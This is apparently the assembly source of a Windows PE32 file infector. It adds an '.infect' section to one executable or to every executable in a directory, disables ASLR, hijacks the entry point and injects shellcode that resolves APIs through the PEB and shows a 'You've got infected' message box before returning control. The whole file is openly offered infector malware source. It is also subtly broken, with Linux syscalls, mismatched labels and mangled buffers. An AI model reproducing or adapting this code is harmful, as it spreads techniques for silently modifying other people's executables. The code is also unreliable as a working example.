  .486
  .model flat, stdcall
  option casemap:none

  include c:\masm32\include\windows.inc
  include c:\masm32\macros\macros.asm

  include c:\masm32\include\masm32.inc
  include c:\masm32\include\gdi32.inc
  include c:\masm32\include\user32.inc
  include c:\masm32\include\kernel32.inc
  include c:\masm32\include\shell32.inc


  includelib c:\masm32\lib\masm32.lib
  includelib c:\masm32\lib\gdi32.lib
  includelib c:\masm32\lib\user32.lib
  includelib c:\masm32\lib\kernel32.lib
  includelib c:\masm32\lib\shell32.lib

  IMAGE_FIRST_SECTION MACRO pNtHeader:REQ
    lea eax, [pNtHeader + SIZEOF IMAGE_NT_HEADERS]
  ENDM
  .data 
    fileArg db "-f", 0
    directoryArg db "-d", 0
    usageMsg db "A simple utility for infecting Message Box into any PE32 EXE file", 0
    exampleMsg db "Example: -f <file.exe> -f", 0
    usageDesc db "Usage Description", 0
    fileDesc db "-f Infect Message Box into only one file", 0
    dirDesc db "-d Infect Message Box into one directory", 0

  .code
  
start:
  call main
  exit


GetThirdArg PROC
  LOCAL pArgList[4]:DWORD
  LOCAL nArgs:dword

  push eax
  push ecx
  push edx

  ; Get the command line
  invoke GetCommandLine
  mov ebx, eax  ; Use ebx to store the return value

  ; Split the command line into arguments
  invoke CommandLineToArgvW, ebx, addr nArgs
  mov pArgList, eax

  ; Check if there are at least three arguments
  mov eax, [nArgs]
  cmp eax, 3
  jl _error

  ; Get the third argument
  mov eax, [pArgList + 8]  ; The third argument is at pArgList[2]

  ; Convert the third argument from wide string to ANSI string
  invoke WideCharToMultiByte, CP_ACP, 0, eax, -1, NULL, 0, NULL, NULL
  mov ecx, eax
  invoke GlobalAlloc, GMEM_FIXED, eax
  mov esi, eax ; esi points to the allocated memory
  invoke WideCharToMultiByte, CP_ACP, 0, [pArgList + 8], -1, eax, ecx, NULL, NULL
 

  ; Clean up
  invoke GlobalFree, pArgList
  mov eax, esi; Return the address of the ANSI string
  pop edx
  pop ecx
  pop eax


  ret

_error:
  mov edx, OFFSET errorMsg
  call WriteConsole

  ; Exit the program
  mov eax, 1
  int 0x80

errorMsg db "An error occurred", 0
  ret
GetThirdArg ENDP

GetAlign PROC sizeOfSection:DWORD, alignment:DWORD, address:DWORD
    ; Calculate size % alignment
    mov eax, sizeOfSection
    xor edx, edx
    div alignment

    ; If size % alignment == 0, return address + size
    test edx, edx
    jz _return_address_plus_size

    ; Otherwise, return address + (size / alignment + 1) * alignment
    inc eax
    imul eax, alignment
    add eax, address
    ret

_return_address_plus_size:
    add eax, address
    ret
GetAlign ENDP

GetEntryPoint PROC pNtHeader:DWORD, pByte:DWORD
  LOCAL first:DWORD
  LOCAL last:DWORD
  LOCAL originEntryPoint:DWORD

  ; Get first section
  mov eax, pNtHeader
  add eax, SIZEOF IMAGE_NT_HEADERS
  mov first, eax

  ; Get last section
  mov ecx, [pNtHeader + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
  dec ecx
  lea eax, [first + ecx * SIZEOF IMAGE_SECTION_HEADER]
  mov last, eax

  ; Point pByte to address offset 0x100 of last section
  mov ecx, [last + IMAGE_SECTION_HEADER.PointerToRawData]
  add ecx, 0x100
  add pByte, ecx

  ; Get origin entry point
  mov eax, [pByte + 14]
  mov originEntryPoint, eax

  ; Return origin entry point
  mov eax, originEntryPoint
  ret
GetEntryPoint ENDP

InfectSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD

  ; Get the first and last section
  mov eax, [pNtHeader]
  add eax, sizeof IMAGE_NT_HEADERS
  mov ecx, [pNtHeader + 6] ; NumberOfSections
  dec ecx
  imul ecx, sizeof IMAGE_SECTION_HEADER
  add eax, ecx
  mov [lastSection], eax

  ; Set file pointer to the beginning
  invoke SetFilePointer, hFile, 0, 0, FILE_BEGIN

  ; Save the OEP
  mov eax, [pNtHeader + 40] ; AddressOfEntryPoint
  add eax, [pNtHeader + 34] ; ImageBase
  mov [OEP], eax

  ; Disable ASLR
  mov eax, IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
  not eax
  and dword ptr [pNtHeader + 70], eax

  ; Change the EP to point to the last section created
  mov eax, [lastSection]
  mov eax, [eax]
  mov [pNtHeader + 40], eax ; AddressOfEntryPoint

  ; Write the file
  invoke WriteFile, hFile, pByte, fileSize, addr bytesWritten, 0

  ; Obtain the opcodes
  lea eax, _loc1
  mov ebx, start
  mov [ebx], eax
  jmp _over
_loc1:
  mov eax, fs:[30h]
  mov eax, [eax + 0Ch] ; PEB
  mov eax, [eax + 0Ch] ; Ldr
  mov eax, [eax + 14h] ; InInitializationOrderModuleList
  mov eax, [eax] ; First module
  mov eax, [eax] ; Second module
  mov eax, [eax + 10h] ; Base address

  mov ebx, eax; Take the base address of kernel32
  mov eax, [ebx + 0x3c]; PE header VMA
  mov edi, [ebx + eax + 0x78]; Export table relative offset
  add edi, ebx; Export table VMA
  mov ecx, [edi + 0x18]; Number of names

  mov edx, [edi + 0x20]; Names table relative offset
  add edx, ebx; Names table VMA

_LLA :
  dec ecx
  mov esi, [edx + ecx * 4]; Store the relative offset of the name
  add esi, ebx; Set esi to the VMA of the current name
  cmp dword ptr[esi], 0x64616f4c; backwards order of bytes L(4c)o(6f)a(61)d(64)
  je _LLALOOP1

_LLALOOP1 :
  cmp dword ptr[esi + 4], 0x7262694c ;L(4c)i(69)b(62)r(72)
  je _LLALOOP2
_LLALOOP2 :
  cmp dword ptr[esi + 8], 0x41797261; third dword = a(61)r(72)y(79)A(41)
  je stop; if its = then jump to stop because we found it
  jmp _LLA; Load Libr aryA
_stop :
  mov edx, [edi + 0x24]; Table of ordinals relative
  add edx, ebx; Table of ordinals
  mov cx, [edx + 2 * ecx]; function ordinal
  mov edx, [edi + 0x1c]; Address table relative offset
  add edx, ebx; Table address
  mov eax, [edx + 4 * ecx]; ordinal offset
  add eax, ebx; Function VMA


  sub esp, 11
  mov ebx, esp
  mov byte ptr[ebx], 0x75; u
  mov byte ptr[ebx + 1], 0x73; s
  mov byte ptr[ebx + 2], 0x65; e
  mov byte ptr[ebx + 3], 0x72; r
  mov byte ptr[ebx + 4], 0x33; 3
  mov byte ptr[ebx + 5], 0x32; 2
  mov byte ptr[ebx + 6], 0x2e; .
  mov byte ptr[ebx + 7], 0x64; d
  mov byte ptr[ebx + 8], 0x6c; l
  mov byte ptr[ebx + 9], 0x6c; l
  mov byte ptr[ebx + 10], 0x0

  push ebx

  call eax;
  add esp, 11
  push eax


  mov eax, fs:[30h]
  mov eax, [eax + 0x0c]; 12
  mov eax, [eax + 0x14]; 20
  mov eax, [eax]
  mov eax, [eax]
  mov eax, [eax + 0x10]; 16

  mov ebx, eax; Take the base address of kernel32
  mov eax, [ebx + 0x3c]; PE header VMA
  mov edi, [ebx + eax + 0x78]; Export table relative offset
  add edi, ebx; Export table VMA
  mov ecx, [edi + 0x18]; Number of names

  mov edx, [edi + 0x20]; Names table relative offset
  add edx, ebx; Names table VMA
_GPA :
  dec ecx
  mov esi, [edx + ecx * 4]; Store the relative offset of the name
  add esi, ebx; Set esi to the VMA of the current name
  cmp dword ptr[esi], 0x50746547; backwards order of bytes G(47)e(65)t(74)P(50)
  je _GPALOOP1

_GPALOOP1 :
  cmp dword ptr[esi + 4], 0x41636f72;  r(72)o(6f)c(63)A(41)
  je _GPALOOP2
_GPALOOP2 :
  cmp dword ptr[esi + 8], 0x65726464; third dword = d(64)d(64)r(72)e(65)
  je _stp; if its = then jump to stop because we found it
  jmp _GPA
_stp :
  mov   edx, [edi + 0x24]; Table of ordinals relative
  add   edx, ebx; Table of ordinals
  mov   cx, [edx + 2 * ecx]; function ordinal
  mov   edx, [edi + 0x1c]; Address table relative offset
  add   edx, ebx; Table address
  mov   eax, [edx + 4 * ecx]; ordinal offset
  add   eax, ebx; Function VMA 
  ; EAX HOLDS THE ADDRESS OF GetProcAddress
  mov esi, eax

  sub esp, 12
  mov ebx, esp
  mov byte ptr[ebx], 0x4d; M
  mov byte ptr[ebx + 1], 0x65 ;e
  mov byte ptr[ebx + 2], 0x73 ;s
  mov byte ptr[ebx + 3], 0x73 ;s
  mov byte ptr[ebx + 4], 0x61 ;a
  mov byte ptr[ebx + 5], 0x67 ;g
  mov byte ptr[ebx + 6], 0x65 ;e
  mov byte ptr[ebx + 7], 0x42 ;B
  mov byte ptr[ebx + 8], 0x6f ;o
  mov byte ptr[ebx + 9], 0x78 ; x
  mov byte ptr[ebx + 10], 0x41 ;A
  mov byte ptr[ebx + 11], 0x0

      ;;;;;;;;
         ; get back the value saved from LoadLibraryA return
         ; So that the call to GetProcAddress is:
          ;esi(saved eax{address of user32.dll module}, ebx {the string "MessageBoxA"})
  mov byte ptr[ebx], 89;      Y
  mov byte ptr[ebx + 1], 111; o
  mov byte ptr[ebx + 2], 117; u
  mov byte ptr[ebx + 3], 39; `
  mov byte ptr[ebx + 4], 118; v
  mov byte ptr[ebx + 5], 101; e
  mov byte ptr[ebx + 6], 32; 
  mov byte ptr[ebx + 7], 103; g
  mov byte ptr[ebx + 8], 111; o
  mov byte ptr[ebx + 9], 116; t
  mov byte ptr[ebx + 10], 32; 
  mov byte ptr[ebx + 11], 105; i
  mov byte ptr[ebx + 12], 110; n
  mov byte ptr[ebx + 13], 102; f
  mov byte ptr[ebx + 14], 101; e
  mov byte ptr[ebx + 15], 99;  c
  mov byte ptr[ebx + 16], 116; t
  mov byte ptr[ebx + 17], 101; e
  mov byte ptr[ebx + 18], 100; d
  mov byte ptr[ebx + 19], 0


  push 0
  push 0
  push ebx
  push 0
  call eax
  add esp, 8

  mov eax, 0xdeadbeef ;Original Entry point
  jmp eax
over:
  mov eax, offset _loc2
  mov [endLabel], eax
_loc2:

  ; Initialize variables
  mov edi, offset address
  mov esi, offset start
  mov ecx, (endLabel - 11) - start
  xor edx, edx

; Loop over bytes
_loop:
  ; Check for placeholder
  mov eax, [esi + edx]
  cmp eax, 0xdeadbeef
  jne _next

  ; Replace placeholder with OEP
  carrier DWORD ?
  lea eax, [esi + edx]
  push ecx
  push edi
  push esi
  push edx
  invoke VirtualProtect, eax, 4, PAGE_EXECUTE_READWRITE, offset carrier
  mov [esi + edx], OEP
  pop edx
  pop esi
  pop edi
  pop ecx

_next:
  ; Copy byte
  mov al, [esi + edx]
  mov [edi + edx], al
  inc edx
  loop _loop

  ; Write to file
  lea eax, lastSection.PointerToRawData
  invoke SetFilePointer, hFile, eax, NULL, FILE_BEGIN
  lea eax, address
  lea ebx, bytesWritten
  invoke WriteFile, hFile, eax, edx, ebx, NULL
  invoke CloseHandle, hFile

  mov eax, 1
  ret

InfectSection endp

CreateNewSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD, sizeOfSection:DWORD
  ; Get the first section headerI

  IMAGE_FIRST_SECTION pNtHeader
  mov ebx, eax

  ; Get the number of sections
  mov eax, pNtHeader
  add eax, 6 ; Offset of NumberOfSections in IMAGE_FILE_HEADER
  movzx ecx, word ptr [eax]

  ; Section name
  push ".infect"
  pop esi

  ; Check if the section already exists
  xor edx, edx
_checkSection:
  mov eax, [ebx + edx * 40] ; Offset of Name in IMAGE_SECTION_HEADER
  cmp eax, esi
  je _sectionExists
  inc edx
  cmp edx, ecx
  jl _checkSection

  ; Initialize the new section header
  lea eax, [ebx + ecx * 40]
  push eax  ; Save the original value of eax
  push ecx  ; Save the original value of ecx
  mov ecx, 40  ; Set the count to 40
  mov edi, eax  ; Set the destination to eax
  xor eax, eax  ; Set the value to 0
  rep stosb  ; Fill the memory with zeros
  pop ecx  ; Restore the original value of ecx
  pop eax  ; Restore the original value of eax
  mov [eax], esi


  ; Set the section attributes
  mov eax, [pNtHeader + 60]
  invoke GetAlign, sizeOfSection, eax, 0
  mov [eax + 8], eax ; Offset of Misc.VirtualSize in IMAGE_SECTION_HEADER
  mov edx, [ebx + (ecx - 1) * 40 + 8]
  mov eax, [pNtHeader + 56]
  mov edi, [ebx + (ecx - 1) * 40 + 12]
  invoke GetAlign, edx, eax, edi
  mov [eax + 12], eax ; Offset of VirtualAddress in IMAGE_SECTION_HEADER
  invoke GetAlign, sizeOfSection, [pNtHeader + 60], 0
  mov [eax + 16], eax ; Offset of SizeOfRawData in IMAGE_SECTION_HEADER
  mov edx, [ebx + (ecx - 1) * 40 + 16]
  mov eax, [pNtHeader + 56]
  mov edi, [ebx + (ecx - 1) * 40 + 12]
  invoke GetAlign, edx, eax, edi 
  mov [eax + 20], eax ; Offset of PointerToRawData in IMAGE_SECTION_HEADER
  mov dword ptr [eax + 36], 0E00000E0h ; Offset of Characteristics in IMAGE_SECTION_HEADER

  ; Update the file
  invoke SetFilePointer, hFile, [eax + 20] + [eax + 16], 0, FILE_BEGIN
  invoke SetEndOfFile, hFile
  mov edx, [eax + 12]
  add edx, [eax + 8]
  add [pNtHeader + 80], edx ; Offset of SizeOfImage in IMAGE_OPTIONAL_HEADER
  inc word ptr [pNtHeader + 6]
  invoke SetFilePointer, hFile, 0, 0, FILE_BEGIN
  invoke WriteFile, hFile, pByte, fileSize, addr bytesWritten, 0
  mov eax, 1
  ret

_sectionExists:
  invoke CloseHandle, hFile
  xor eax, eax
  ret
CreateNewSection endp

OpenFile proc  nameOfFile:DWORD
  LOCAL hFile:HANDLE
  LOCAL fileSize:DWORD
  LOCAL pByte:DWORD
  LOCAL byteWritten:DWORD
  LOCAL pDosHeader:DWORD
  LOCAL pNtHeader:DWORD



  invoke CreateFile , nameOfFile, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
  mov hFile, eax
  cmp eax, INVALID_HANDLE_VALUE
  je _exit

  invoke GetFileSize, hFile, NULL
  mov fileSize, eax
  cmp eax, 0
  je _closeHandle

  invoke GlobalAlloc, GMEM_FIXED, fileSize
  mov pByte, eax

  invoke ReadFile, hFile, pByte, fileSize, addr byteWritten, NULL
  cmp eax, 0
  je _closeHandle

  mov eax, pByte
  mov pDosHeader, eax
  cmp word ptr [eax], IMAGE_DOS_SIGNATURE
  jne _closeHandle

  add eax, [eax + 3Ch]
  mov pNtHeader, eax
  cmp word ptr [eax + 4], IMAGE_FILE_MACHINE_I386
  jne _closeHandle

  invoke CreateNewSection, hFile, pNtHeader, pByte, fileSize, addr byteWritten, 400
  cmp eax, 0
  je _closeHandle

  invoke InfectSection, hFile, pNtHeader, pByte, fileSize, addr byteWritten
  cmp eax, 0
  je _closeHandle

_closeHandle:
  invoke CloseHandle, hFile

_exit:
  ret
OpenFile endp

OpenDirectory proc pathDirectory:DWORD
  LOCAL hFind:HANDLE
  LOCAL findData:WIN32_FIND_DATA
  LOCAL filePath[260]:BYTE
  LOCAL countFile:DWORD

  mov countFile, 0

  invoke lstrcpy, addr filePath, pathDirectory
  invoke lstrcat, addr filePath, "\*.exe"

  invoke FindFirstFile, addr filePath, addr findData
  cmp eax, INVALID_HANDLE_VALUE
  je _exit
  mov hFind, eax

_nextFile:
  invoke OpenFile, addr findData.cFileName
  inc countFile

  invoke FindNextFile, hFind, addr findData
  cmp eax, 0
  jne _nextFile

  invoke FindClose, hFind

  cmp countFile, 0
  je _exit

  mov eax, 1
  ret

_exit:
  xor eax, eax
  ret
OpenDirectory endp




main proc
  LOCAL cmdline:DWORD
  LOCAL cmdlen:DWORD
  
  ;Get command line
  invoke GetCommandLine
  mov cmdline, eax

  invoke lstrlen, cmdline
  mov cmdlen, eax
  cmp cmdlen, 2
  jl _printUsage

  ; Check for "-r" argument

  invoke InString, 1, cmdline, offset fileArg
  cmp eax, 0
  jne _openFile

  invoke InString, 1, cmdline, offset directoryArg
  cmp eax, 0
  jne _openDirectory

_printUsage:
  print offset usageMsg
  print offset exampleMsg
  print offset usageDesc
  print offset fileDesc
  print offset dirDesc
  jmp _exit


_openFile:
  call GetThirdArg
  push eax
  call OpenFile
  jmp _exit

_openDirectory:
  invoke OpenDirectory
  jmp _exit

_exit:
  invoke ExitProcess, 0


  ret
main endp

end start

